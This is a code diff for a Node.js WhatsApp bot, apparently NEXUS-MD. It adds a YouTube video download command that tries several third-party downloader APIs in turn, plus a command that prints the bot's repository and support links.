+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (audioResponse.ok) {
+            const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
+            if (audioBuffer.length > 5000) {
+              const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'audio';
+              const fileName = `${safeTitle}.mp3`;
+
+              try {
+                await sock.sendMessage(from, {
+                  audio: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (OmegaTech)*`
+                });
+                return;
+              } catch (sendErr) {
+                await sock.sendMessage(from, {
+                  document: audioBuffer,
+                  mimetype: 'audio/mpeg',
+                  fileName: fileName,
+                  caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (omegaErr) {
+      console.warn('OmegaTech API failed:', omegaErr.message);
+    }
+
+    // ==========================================================
+    // STEP 7: All APIs failed
+    // ==========================================================
+    await sock.sendMessage(from, { 
+      text: `⚠️ All download methods failed for "${query}".\n\n💡 Try:\n• A different song name\n• A direct YouTube URL\n• Wait a few minutes and retry\n\n${isUrl ? 'The video might be age-restricted or private.' : ''}` 
+    });
   }
 });
 
@@ -4844,6 +7830,347 @@ register({
   async execute({ sock, from }) {
     await sock.sendMessage(from, { text: `⏱ Uptime: ${formatUptime(Date.now() - START_TIME)}` });
   },
+});
+register({
+  name: 'playvideo',
+  aliases: ['playv', 'ytmp4', 'ytvideo', 'watch', 'vplay'],
+  category: 'DOWNLOADER',
+  description: 'Search and download YouTube videos (MP4)',
+  async execute({ sock, from, args, prefix, command }) {
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🎬 *Video Player*\n\nUsage: ${prefix}${command} <song name or URL>\nExample: ${prefix}${command} Music Video\n\n*Examples:*\n${prefix}${command} Shape of You\n${prefix}${command} https://youtu.be/60ItHLz5WEA\n\n*Quality:* Best available (up to 1080p)\n*Note:* Videos over 16MB sent as documents.` 
+      });
+    }
+
+    const query = args.join(" ");
+    const isUrl = query.includes('youtube.com') || query.includes('youtu.be');
+
+    await sock.sendMessage(from, { text: `⏳ Searching for "${query}"...` });
+
+    let videoUrl = query;
+    let title = 'YouTube Video';
+    let thumbnail = '';
+    let duration = '';
+    let artist = '';
+
+    // ==========================================================
+    // STEP 1: If not a URL, search via yt-search
+    // ==========================================================
+    if (!isUrl) {
+      try {
+        const yts = require('yt-search');
+        const searchResults = await yts(query);
+        
+        if (!searchResults || !searchResults.videos || searchResults.videos.length === 0) {
+          return await sock.sendMessage(from, { 
+            text: `❌ No results found for "${query}".\n\n💡 Try a different search term.` 
+          });
+        }
+
+        const target = searchResults.videos[0];
+        videoUrl = target.url;
+        title = target.title || 'YouTube Video';
+        thumbnail = target.thumbnail || target.image || '';
+        duration = target.timestamp || target.duration || '';
+        artist = target.author?.name || target.author || '';
+
+      } catch (ytErr) {
+        console.warn('yt-search failed:', ytErr.message);
+      }
+    }
+
+    // Send thumbnail if available
+    if (thumbnail) {
+      try {
+        await sock.sendMessage(from, {
+          image: { url: thumbnail },
+          caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading video...*`
+        });
+      } catch (thumbErr) {
+        await sock.sendMessage(from, { 
+          text: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading video...*` 
+        });
+      }
+    }
+
+    // ==========================================================
+    // STEP 2: Try PRIMARY API - EliteProTech (MP4)
+    // ==========================================================
+    try {
+      const eliteUrl = `https://eliteprotech-apis.zone.id/ytmp4?url=${encodeURIComponent(videoUrl)}`;
+      const eliteRes = await fetch(eliteUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (eliteRes.ok) {
+        const eliteData = await eliteRes.json();
+        
+        let videoDownloadUrl = eliteData.result?.url || eliteData.result?.download_url || 
+                               eliteData.url || eliteData.download_url || eliteData.result;
+
+        if (!videoDownloadUrl) {
+          const jsonString = JSON.stringify(eliteData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
+          if (urlMatch) videoDownloadUrl = urlMatch[0];
+        }
+
+        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
+          const videoResponse = await fetch(videoDownloadUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (videoResponse.ok) {
+            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
+            if (videoBuffer.length > 5000) {
+              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
+              const fileName = `${safeTitle}.mp4`;
+
+              // Check if video is too large for WhatsApp (16MB limit)
+              if (videoBuffer.length > 16 * 1024 * 1024) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to WhatsApp 16MB limit.*`
+                });
+                return;
+              }
+
+              try {
+                await sock.sendMessage(from, {
+                  video: videoBuffer,
+                  mimetype: 'video/mp4',
+                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (EliteProTech)*`
+                });
+                return;
+              } catch (sendErr) {
+                // Fallback: send as document
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (eliteErr) {
+      console.warn('EliteProTech MP4 failed:', eliteErr.message);
+    }
+
+    // ==========================================================
+    // STEP 3: Fallback API - David Cyril (MP4)
+    // ==========================================================
+    try {
+      const davidUrl = `https://apis.davidcyril.name.ng/play?url=${encodeURIComponent(videoUrl)}&format=mp4`;
+      const davidRes = await fetch(davidUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (davidRes.ok) {
+        const davidData = await davidRes.json();
+        
+        let videoDownloadUrl = davidData.result?.url || davidData.result?.download_url || 
+                               davidData.url || davidData.download_url || davidData.result;
+
+        if (!videoDownloadUrl) {
+          const jsonString = JSON.stringify(davidData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
+          if (urlMatch) videoDownloadUrl = urlMatch[0];
+        }
+
+        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
+          const videoResponse = await fetch(videoDownloadUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (videoResponse.ok) {
+            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
+            if (videoBuffer.length > 5000) {
+              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
+              const fileName = `${safeTitle}.mp4`;
+
+              if (videoBuffer.length > 16 * 1024 * 1024) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to size limit.*`
+                });
+                return;
+              }
+
+              try {
+                await sock.sendMessage(from, {
+                  video: videoBuffer,
+                  mimetype: 'video/mp4',
+                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (David Cyril)*`
+                });
+                return;
+              } catch (sendErr) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (davidErr) {
+      console.warn('David Cyril MP4 failed:', davidErr.message);
+    }
+
+    // ==========================================================
+    // STEP 4: Third Fallback - Prince API (MP4)
+    // ==========================================================
+    try {
+      const princeUrl = `https://api.princetechn.com/api/download/ytmp4?apikey=prince&url=${encodeURIComponent(videoUrl)}`;
+      const princeRes = await fetch(princeUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (princeRes.ok) {
+        const princeData = await princeRes.json();
+        
+        let videoDownloadUrl = princeData.result?.download_url || princeData.result?.url || 
+                               princeData.download_url || princeData.url || princeData.result;
+
+        if (!videoDownloadUrl) {
+          const jsonString = JSON.stringify(princeData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
+          if (urlMatch) videoDownloadUrl = urlMatch[0];
+        }
+
+        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
+          const videoResponse = await fetch(videoDownloadUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (videoResponse.ok) {
+            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
+            if (videoBuffer.length > 5000) {
+              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
+              const fileName = `${safeTitle}.mp4`;
+
+              if (videoBuffer.length > 16 * 1024 * 1024) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to size limit.*`
+                });
+                return;
+              }
+
+              try {
+                await sock.sendMessage(from, {
+                  video: videoBuffer,
+                  mimetype: 'video/mp4',
+                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (Prince)*`
+                });
+                return;
+              } catch (sendErr) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (princeErr) {
+      console.warn('Prince MP4 failed:', princeErr.message);
+    }
+
+    // ==========================================================
+    // STEP 5: Final Fallback - GiftedTech API
+    // ==========================================================
+    try {
+      const giftedUrl = `https://api.giftedtech.co.ke/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(videoUrl)}&quality=720p`;
+      const giftedRes = await fetch(giftedUrl, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (giftedRes.ok) {
+        const giftedData = await giftedRes.json();
+        
+        let videoDownloadUrl = giftedData.result?.download_url || giftedData.result?.url || 
+                               giftedData.download_url || giftedData.url || giftedData.result;
+
+        if (!videoDownloadUrl) {
+          const jsonString = JSON.stringify(giftedData);
+          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
+          if (urlMatch) videoDownloadUrl = urlMatch[0];
+        }
+
+        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
+          const videoResponse = await fetch(videoDownloadUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (videoResponse.ok) {
+            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
+            if (videoBuffer.length > 5000) {
+              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
+              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
+              const fileName = `${safeTitle}.mp4`;
+
+              if (videoBuffer.length > 16 * 1024 * 1024) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to size limit.*`
+                });
+                return;
+              }
+
+              try {
+                await sock.sendMessage(from, {
+                  video: videoBuffer,
+                  mimetype: 'video/mp4',
+                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (GiftedTech)*`
+                });
+                return;
+              } catch (sendErr) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: fileName,
+                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
+                });
+                return;
+              }
+            }
+          }
+        }
+      }
+    } catch (giftedErr) {
+      console.warn('GiftedTech MP4 failed:', giftedErr.message);
+    }
+
+    // ==========================================================
+    // STEP 6: All APIs failed
+    // ==========================================================
+    await sock.sendMessage(from, { 
+      text: `⚠️ All download methods failed for "${query}".\n\n💡 Try:\n• A different video name\n• A direct YouTube URL\n• Using ${prefix}ytmp4 or ${prefix}ytv (fallback commands)\n• Wait a few minutes and retry\n\n${isUrl ? 'The video might be age-restricted or private.' : ''}` 
+    });
+  }
 });
 
 register({
@@ -4994,7 +8321,51 @@ register({
     });
   },
 });
+register({
+  name: 'repo',
+  aliases: ['repository', 'sourcecode', 'github', 'source'],
+  category: 'MAIN',
+  description: 'Get the bot repository and source code information',
+  async execute({ sock, from, prefix, command }) {
+    const repoInfo = `╭━━━━━━━━━━━━━━━━╮
+┃   🤖 *NEXUS-MD REPO*
+╰━━━━━━━━━━━━━━━━━╯
 
+📦 *Project:* NEXUS-MD
+⚡ *Version:* 2.0.0
+📅 *Updated:* ${new Date().toLocaleDateString('en-US', { day: 'numeric', month: 'long', year: 'numeric' })}
+
+🔗 *Pair Link:*
+https://web-production-26c60e.up.railway.app/
+
+📂 *Commands:* ${new Set(commands.values()).size}
+📊 *Features:* Downloader, AI, Group Admin, Tools, Security
+
+📝 *Description:*
+Multi-device WhatsApp bot with advanced features.
+Multi-session support • Auto-bio • Channel forwarding
+
+💻 *Stack:*
+• Node.js (Baileys)
+• Railway.app (Hosting)
+• MongoDB/JSON (Storage)
+
+👑 *Owner:* @DEVZUKO
+
+╭━━━━━━━━━━━━━━━━━━━╮
+┃    *Quick Links*
+╰━━━━━━━━━━━━━━━━━━━╯
+🔄 Pair: https://web-production-26c60e.up.railway.app
+💬 Support: https://chat.whatsapp.com/GMHYNRFJhyiFhM5h5tE0FX?s=cl&p=a&ilr=0
+⛓️Channel: https://whatsapp.com/channel/0029VbCoHP4Id7nGRtKYuA0A
+
+╰━━━━━━━━━━━━━━━━━━━╯
+✨ _Made with 🔥 by NEXUS-MD_`;
+
+    // Send as text
+    await sock.sendMessage(from, { text: repoInfo });
+  }
+});
 // ---------- TOOLS ----------
 
 register({
